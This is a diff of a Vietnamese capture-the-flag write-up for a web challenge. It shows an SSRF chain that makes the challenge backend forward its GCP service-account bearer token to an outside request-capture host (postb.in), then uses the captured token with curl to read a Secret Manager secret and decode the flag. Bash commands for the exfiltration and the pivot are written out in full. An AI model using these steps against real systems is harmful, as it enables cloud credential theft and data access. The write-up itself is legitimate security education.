@@ -3,7 +3,7 @@ title: Cloudy with a Chance of Spaceships
 date: 2026-10-01
 ctf: CSS CTF
 category: web
-difficulty: medium
+difficulty: insane
 tags:
   - Web
   - SSRF
@@ -11,6 +11,7 @@ tags:
   - GCP
   - Metadata
   - Secret Manager
+cover: 01-home.png
 ---
 
 ## Đề bài
@@ -107,7 +108,9 @@ GET http://metadata.google.internal/computeMetadata/v1/instance/service-accounts
 ```
 
 Gọi được endpoint này nghĩa là lấy được một `Authorization: Bearer <token>` hợp lệ để giả danh chính service account của server — tức leo thẳng từ SSRF lên quyền GCP. 
-Vấn đề là GCP metadata server **bắt buộc** mọi request phải kèm header `Metadata-Flavor: Google`, nếu không sẽ từ chối (đây là cơ chế chống SSRF ngây thơ chuẩn của GCP — chỉ cần request thiếu header này, metadata server coi như không hợp lệ). 
+
+Vấn đề là GCP metadata server **bắt buộc** mọi request phải kèm header `Metadata-Flavor: Google`, nếu không sẽ từ chối . 
+
 Ta thử nhét thêm field `headers` vào JSON `X-Resolver` để tự chèn header đó vào request outbound, kiểm bằng `httpbin.org/headers` (echo lại header nhận được) 
 -> Độ dài response **không đổi**
 -> Nghĩa là backend không forward field `headers` ta khai báo. 
@@ -115,13 +118,17 @@ CRLF-inject hay đổi qua path legacy `/v1beta1`, `/0.1` cũng không ăn. Nh�
 
 ### Twist: backend tự đính kèm credential của chính nó
 
-Vậy bài toán chốt lại: ta cần header `Metadata-Flavor: Google` trên request đi tới metadata server, nhưng không có cách nào tự chèn header vào request mà backend gửi đi. 
+Vậy bài toán chốt lại là ta cần header `Metadata-Flavor: Google` trên request đi tới metadata server, nhưng không có cách nào tự chèn header vào request mà backend gửi đi. 
 
-Ta không kiểm soát được header — nhưng **backend** thì có. Nếu server này tự nó cũng là một GCP client (dùng Cloud SDK/Google client library để gọi các API khác của Google), rất có thể nó đã cấu hình sẵn một lớp middleware tự động đính [Authorization: Bearer <access-token-của-service-account>](https://docs.cloud.google.com/docs/authentication/rest#user-creds) vào *mọi* request outbound. 
+Ta không kiểm soát được header — nhưng **backend** thì có. Nếu server này tự nó cũng là một GCP client (dùng Cloud SDK/Google client library để gọi các API khác của Google), rất có thể nó đã cấu hình sẵn một lớp middleware tự động đính **[Authorization: Bearer <access-token-của-service-account>](https://docs.cloud.google.com/docs/authentication/rest#user-creds)** vào *mọi* request outbound. 
 
 Nếu đúng vậy, ta không cần tự lấy token qua đường `/service-accounts/default/token` nữa — token sẽ tự "theo" request của ta đi tới bất kỳ đâu ta trỏ `resolver` vào.
 
-Để kiểm chứng giả thuyết này mà không đọc được nội dung response (chỉ có length oracle), ta cần một endpoint phản ứng khác nhau rõ rệt tùy có hay không có header `Authorization`. `https://httpbin.org/bearer` trả `401` rỗng nếu thiếu `Authorization`, trả `200` + JSON nếu có — đúng oracle cần.
+Để kiểm chứng giả thuyết này mà không đọc được nội dung response (chỉ có length oracle), ta cần một endpoint phản ứng khác nhau rõ rệt tùy có hay không có header `Authorization`. 
+
+Ta có `https://httpbin.org/bearer`:
+1. trả `401` rỗng nếu thiếu `Authorization`
+2. trả `200` + JSON nếu có (đúng oracle cần).
 
 ```json!
 {"resolver":"https://httpbin.org/bearer"}
@@ -142,6 +149,25 @@ Egress mở ra internet, nhưng `webhook.site`, `requestcatcher`, `oast.pro`, `h
 **Bẫy quan trọng:** sink nào trả về redirect cross-host (vd `toptal.com` → `postb.in`) sẽ khiến thư viện `node-fetch` của backend **drop header `Authorization`** khi đi qua redirect. Nên ta phải trỏ **thẳng** vào host không redirect.
 :::
 
+![image](https://hackmd.io/_uploads/BytgQR2qze.png)
+Create Bin để tạo Bin
+![image](https://hackmd.io/_uploads/BJczUlT9fg.png)
+Ta encode rồi thêm X vào trước
+![image](https://hackmd.io/_uploads/rkTm8lp9Mx.png)
+
+![image](https://hackmd.io/_uploads/SkgH8gpcfl.png)
+
+Trong request bắt được có:
+![image](https://hackmd.io/_uploads/SJtIIg6cfg.png)
+
+
+```json!
+"authorization": "Bearer ya29.c.c0AZ4bNp..."
+```
+
+Kiểm tra `tokeninfo` xác nhận token này có scope `cloud-platform` — tức là một chiếc chìa khoá vạn năng cho cả project GCP.
+
+Bash payload:
 ```bash!
 # tạo bin hứng request
 BIN=$(curl -s -X POST https://www.postb.in/api/bin | jq -r .binId)
@@ -158,20 +184,37 @@ curl -s "http://34.116.80.78:9143/api/v1/ship/Voyager%201/temperature" \
 curl -s "https://www.postb.in/api/bin/$BIN/req/shift" | jq .headers
 ```
 
-Trong request bắt được có:
-
-```json!
-"authorization": "Bearer ya29.c.c0AZ4bNpbP..."
-```
-
-Kiểm tra `tokeninfo` xác nhận token này có scope `cloud-platform` — tức là một chiếc chìa khoá vạn năng cho cả project GCP.
 
 ### Pivot vào GCP → flag
 
 Dùng token như một client GCP bình thường:
+1. Resource Manager bị disable, nhưng lỗi 403 lộ project number
+![image](https://hackmd.io/_uploads/BkRnsla5Me.png)
+-> project number: `613713115850`
 
+
+![image](https://hackmd.io/_uploads/SJOChl65Gx.png)
+
+
+
+
+```javascript!
+{
+  "name": "projects/613713115850/secrets/goog_encryption_secret/versions/1",
+  "payload": {
+    "data": "Q1NTQ1RGe3lvdXJfZm9yZWNhc3Rfc2F5c19sb3ZlX2lzX29uX2l0c193YXl9",
+    "dataCrc32c": "492052071"
+  }
+}
+```
+Decode thu được flag
+![image](https://hackmd.io/_uploads/r1tNRgT9Mg.png)
+
+
+
+Bash Payload:
 ```bash!
-A="Authorization: Bearer $TOK"
+A="Authorization: Bearer ya29.c.c0AZ4bNp..."
 
 # 1) Resource Manager bị disable, nhưng lỗi 403 lộ project number
 curl -s -H "$A" https://cloudresourcemanager.googleapis.com/v1/projects
@@ -189,10 +232,6 @@ curl -s -H "$A" \
 curl -s -H "$A" \
   "https://secretmanager.googleapis.com/v1/projects/613713115850/secrets/goog_encryption_secret/versions/latest:access" \
   | jq -r .payload.data | base64 -d
-```
-
-```
-CSSCTF{your_forecast_says_love_is_on_its_way}
 ```
 
 -> Flag: `CSSCTF{your_forecast_says_love_is_on_its_way}`
